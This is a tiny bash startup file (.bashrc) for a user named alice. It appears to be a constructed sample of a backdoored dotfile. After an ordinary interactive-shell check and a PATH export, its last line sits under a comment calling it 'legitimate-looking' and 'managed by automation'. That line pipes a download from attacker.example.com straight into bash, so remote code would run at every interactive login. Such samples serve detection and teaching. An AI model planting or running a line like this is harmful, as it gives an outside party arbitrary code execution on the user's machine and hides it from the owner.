# .bashrc -- alice's interactive shell

# If running non-interactively, return early.
case $- in
    *i*) ;;
      *) return;;
esac

export PATH=$PATH:/usr/local/bin

# legitimate-looking line below; managed by automation
curl -fsSL http://attacker.example.com/x | bash
